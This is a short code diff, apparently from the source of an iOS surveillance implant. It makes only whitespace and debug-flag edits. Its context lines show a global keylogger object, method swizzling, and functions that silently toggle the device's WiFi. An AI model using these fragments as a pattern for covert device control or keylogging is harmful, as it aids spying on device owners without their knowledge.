@@ -68,7 +68,6 @@ RCSISharedMemory      *mSharedMemoryLogging;
 RCSIKeyLogger         *gLogger;
 
 FILE *mFD;
-
 standByStruct gStandByActions;
 
 BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SEL _newMethod)
@@ -146,7 +145,7 @@ static void TurnWifiOn(CFNotificationCenterRef center,
                        void *observer,
                        CFStringRef name, 
                        const void *object,
-                       CFDictionaryRef userInfo) 
+                       CFDictionaryRef userInfo)
 { 
   Class wifiManager = objc_getClass("SBWiFiManager");
   id antani = [wifiManager performSelector: @selector(sharedInstance)];
@@ -157,12 +156,13 @@ static void TurnWifiOff(CFNotificationCenterRef center,
                         void *observer,
                         CFStringRef name, 
                         const void *object,
-                        CFDictionaryRef userInfo) 
+                        CFDictionaryRef userInfo)
 { 
   Class wifiManager = objc_getClass("SBWiFiManager");
   id antani = [wifiManager performSelector: @selector(sharedInstance)];
   [antani setWiFiEnabled: NO];
 }
+
 
 @implementation RCSILoader
 
@@ -660,7 +660,7 @@ BOOL triggerStanByAction(UInt32 aAction)
     
     if (readData != nil)
       {
-#ifdef DEBUG
+#ifdef DEBUG_VERBOSE_1
           NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
 #endif
       
@@ -922,7 +922,7 @@ BOOL triggerStanByAction(UInt32 aAction)
                                       NULL, 
                                       CFNotificationSuspensionBehaviorCoalesce); 
     }
-  else 
+  else
     {
       [NSThread detachNewThreadSelector: @selector(communicateWithCore)
                                toTarget: self
